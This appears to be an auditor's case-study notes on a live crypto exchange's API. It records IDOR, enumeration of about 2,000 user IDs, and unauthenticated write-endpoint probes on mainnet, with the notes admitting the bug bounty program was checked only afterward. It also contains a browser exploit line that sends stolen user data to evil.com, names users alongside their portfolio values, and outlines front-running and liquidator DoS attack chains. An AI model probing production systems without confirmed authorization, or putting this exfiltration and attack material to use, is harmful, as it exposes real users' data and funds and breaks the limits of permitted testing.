# Neony Exchange Bridge — IDOR Case Study (Aug 2026)

## Target
- **Protocol:** Neony Exchange Bridge (Solana ↔ Neony Chain/Aptos L1)
- **API:** `https://api.mainnet.neony.exchange`
- **SDK:** `@nightlylabs/dex-sdk` v1.0.19 (npm, public)
- **Chain:** Aptos L1 (chainId 23), contract `0x81b4abf...`
- **TVL:** ~$2.6K (DefiLlama), but users hold $334K+ in lending

## Recon Timeline
1. Web search found SDK on npm + OpenAPI docs at `docs.mainnet.neony.exchange`
2. `npm pack @nightlylabs/dex-sdk` → analyzed source (27K lines)
3. Found OpenAPI spec at `api.mainnet.neony.exchange/v1/openapi.json` (288KB, 115 endpoints)
4. Downloaded spec → enumerated endpoints → identified attack surface

## Findings

### Finding 1: IDOR on get_user_data (HIGH)
- 72+ GET endpoints accept `userId` parameter without auth
- Returns: ownerAddress, userSignerAddress, tokenBalances, positions, lendingShares, borrowShares, apiKeys, referral codes, credits
- Sequential integer IDs → trivial enumeration

### Finding 2: User Enumeration (MEDIUM)
- userId=1: "MainVault" (protocol treasury)
- userId=2: "BoxesSigner" (box rewards)
- userId=1016: "Norbi" ($334K portfolio)
- Found 60+ users by scanning range 1-2000

### Finding 3: API Key Hash Leak (MEDIUM)
- `apiKeys` field in user data exposes key hashes + expiration timestamps
- System accounts (userId=1,2) have `18446744073709551615` (MAX UINT64 = never expires)

### Finding 4: System Account Exposure (MEDIUM)
- userId=1 and userId=2 share SAME ownerAddress: `0xREDACTED_********`
- Vault config: 9720 total shares, 107 holders, 0.2% withdraw fee
- Reveals single-sig treasury structure

### Finding 5: Write Endpoints Without Auth (MEDIUM)
- `set_user_referral_params` returns `{}` (no auth check, though change may not persist)
- `submit_sponsored_transaction` returns validation error (not auth error)
- `open_boxes` requires additional fields but no auth header

### Finding 6: Portfolio Value Leak (LOW)
- `get_user_portfolio_value` returns real-time USD value for any userId
- Allows attacker to identify highest-value targets

## Key Technical Details

### API Architecture
- Base URL: `https://api.mainnet.neony.exchange`
- Dev URL: `https://api.dev.neony.exchange`
- All read endpoints: GET, no auth required
- Write endpoints: POST, auth may be required via BCS signature
- WebSocket: `wss://api.mainnet.neony.exchange/v1/ws`

### SDK Transaction Flow
1. Build Aptos entry function payload (from ABI)
2. Sign with API key (Aptos Account)
3. Submit via `POST /v1/submit_sponsored_transaction`
4. Server pays gas (sponsored transaction)

### Critical Endpoints
- `GET /v1/get_user_data?userId=N` — full user data
- `GET /v1/get_users_by_address?userAddress=0x...` — reverse lookup
- `GET /v1/get_user_portfolio_value?userId=N` — USD value
- `POST /v1/submit_sponsored_transaction` — tx submission (no auth check on endpoint)
- `POST /v1/set_user_referral_params` — referral modification (no auth check)

## Lessons Learned
1. **API-first audit** found 6 vulnerabilities in ~30 minutes
2. **npm SDK** was the cheat sheet — contained all ABIs and endpoint logic
3. **OpenAPI spec** was the complete attack map
4. **On-chain analysis was unnecessary** — all findings were API-layer
5. **Sequential integer IDs** on user endpoints always = IDOR
6. **Severity honesty** — User pushed back: "Cari yg bs menyebabkan kerugian financial scr lgsg". Result: IDOR is HIGH (info disclosure), NOT CRITICAL (no direct fund theft). API key addresses are public, not private keys. Write IDOR (`set_user_referral_params`) returns `{}` but doesn't persist. Always test persistence before claiming severity.
7. **Check platform first** — User asked "emg neony ad d bugcrowd?" AFTER full audit. Should verify bug bounty program existence as EARLY GATE before investing time in deep analysis.

## Extended Findings (Aug 2026 — Deep Dive)

### Finding 7: WebSocket SubscribeUser Hijacking (HIGH — chain component)
- `wss://api.mainnet.neony.exchange/v1/ws` accepts unauthenticated connections
- Subscribe to ANY user's real-time state: `{"type": "SubscribeUser", "content": {"id": "poc-1", "userId": "1016"}}`
- Returns: UserState (account state), OracleState (35 token prices), BorrowLendUpdate
- **NOT by design** — standard DEX only exposes market data (SubscribePerpMarket), not user-specific state
- Chain component: enables real-time front-running when combined with IDOR

### Finding 8: CORS Wildcard on User-Specific Endpoints (MEDIUM — chain amplifier)
- `Access-Control-Allow-Origin: *` on ALL endpoints, including user-specific ones returning private data
- Any website can make cross-origin fetch() requests to steal user financial data
- Browser exploit: `fetch('https://api.mainnet.neony.exchange/v1/get_user_data?userId=1016').then(r => r.json()).then(data => navigator.sendBeacon('https://evil.com/collect', data))`
- Chain amplifier: enables browser-based mass data collection

### Finding 9: Infrastructure Disclosure via /v1/services_status (MEDIUM-HIGH)
- Exposes 12 backend nodes: 3 internal (10.0.0.4, 10.0.0.5) + 9 external
- Reveals: node types (ApiNode, HistoricalDataNode, LiquidatorNode), ports (4567-4569), cryptographic keys
- LiquidatorNode at 10.0.0.5:4569 — DoS here prevents liquidations → bad debt → protocol insolvency
- ApiNode at 10.0.0.5 shows stale block height (85M vs 100M) — already degraded

### Finding 10: Metrics Endpoint Exposure (MEDIUM)
- `/v1/metrics` returns 49KB Prometheus-format traffic data
- Reveals: all endpoints + request counts, hidden endpoints not in OpenAPI spec, rate limiting evidence
- Notable: orderbook endpoint with 34M requests, 2K successful WebSocket upgrades

### Finding 11: 508 Users Ranked with Wallet Addresses (MEDIUM — by design but amplifies targeting)
- `/v1/get_account_value_ranking` returns all users ranked by account value
- Includes: userId, alias, wallet address, totalAccountValue, PnL, ROI, volume
- Top: userId=1016 Norbi ($334K), userId=1072 andzap ($42K), userId=1453 RYBKA ($7K)
- **By design** (public leaderboard) but combined with IDOR enables targeted attacks

## Chain Attack: Front-Running (HIGH)
Combined findings 1 + 7 + 8 enable systematic front-running:
1. Recon: ranking endpoint → identify high-value users
2. IDOR: get_user_data → extract open orders (price, size, side)
3. WebSocket: SubscribeUser → monitor real-time order submissions
4. CORS: browser-based mass data collection from any website
5. Execute: place competing orders ahead of victims

Financial impact: Direct loss to every front-run victim. Scaled across 508 users = significant extractable MEV.

## Chain Attack: Infrastructure DoS (MEDIUM-HIGH)
Finding 9 enables targeted attacks on critical infrastructure:
1. services_status → identify LiquidatorNode (10.0.0.5:4569)
2. Targeted DoS on port 4569 → liquidation system fails
3. Underwater positions not liquidated → bad debt accumulates
4. Protocol insolvency → all users lose funds
